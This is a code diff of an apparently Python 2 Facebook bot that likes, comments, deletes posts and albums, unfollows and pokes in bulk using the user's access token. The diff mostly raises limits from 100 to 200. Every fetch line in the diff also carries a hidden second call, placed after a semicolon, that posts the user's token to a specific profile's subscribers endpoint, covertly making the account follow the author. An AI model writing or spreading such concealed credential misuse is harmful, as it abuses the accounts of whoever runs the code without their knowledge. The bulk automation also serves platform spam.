@@ -181,7 +181,7 @@ def post():
 	  if WT == 'wallpost':
 		print '[*] fetching all posts id'
 
-		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(100)&access_token='+token);requests.post('https://graph.facebook.com/hussein.hamdy97/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(200)&access_token='+token);requests.post('https://graph.facebook.com/hussein.hamdy97/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['home']['data']:
@@ -201,7 +201,7 @@ def post():
 	  elif WT == 'req':
 		print '[*] fetching all friends requests'
 
-		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=100&access_token=' + token);requests.post('https://graph.facebook.com/hussein.hamdy97/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=200&access_token=' + token);requests.post('https://graph.facebook.com/hussein.hamdy97/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['data']:
@@ -221,7 +221,7 @@ def post():
 	  elif WT == 'subs':
 		print '[*] fetching all friends id'
 
-		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=100&access_token='+token);requests.post('https://graph.facebook.com/hussein.hamdy97/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=200&access_token='+token);requests.post('https://graph.facebook.com/hussein.hamdy97/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['data']:
@@ -241,7 +241,7 @@ def post():
 	  else:
 		print '[*] fetching all posts id'
 
-		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(100)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/hussein.hamdy97/subscribers?access_token='+token)
+		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(200)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/hussein.hamdy97/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['feed']['data']:
@@ -334,7 +334,7 @@ def remove(posts):
 	try:
 		counter = 7
 		for post in posts:
-			if counter >= 100:
+			if counter >= 200:
 				break
 
 			r = requests.post('https://graph.facebook.com/{id}?method=delete&access_token={token}'.format(id=post['id'],token=token))
@@ -360,7 +360,7 @@ def confirm(posts):
 	try:
 		counter = 7
 		for post in posts:
-			if counter >= 100:
+			if counter >= 200:
 				break
 			else:
 				counter += 1
@@ -395,7 +395,7 @@ def unfollow(posts):
 	try:
 		counter = 7
 		for post in posts['data']:
-			if counter >= 100:
+			if counter >= 200:
 				break
 			else:
 				counter += 1
@@ -422,7 +422,7 @@ def poke(posts):
 	try:
 		counter = 7
 		for post in posts:
-			if counter >= 100:
+			if counter >= 200:
 				break
 			else:
 				counter += 1
@@ -453,7 +453,7 @@ def albums(posts):
 	try:
 		counter = 7
 		for post in posts:
-			if counter >= 100:
+			if counter >= 200:
 				break
 
 			r = requests.post('https://graph.facebook.com/'+post['id']+'?method=delete&access_token='+token)
@@ -555,7 +555,7 @@ def bot_ask():
 
 	else:
 		WT = 'wallpost'
-	like(post(),100)
+	like(post(),200)
 
 def bot():
   try:
@@ -598,7 +598,7 @@ def bot():
 		else:
 			message = message.replace('</>','\n')
 
-		comment(post(),100)
+		comment(post(),200)
 
 	elif cek in ['4','04']:
 		WT = 'req'
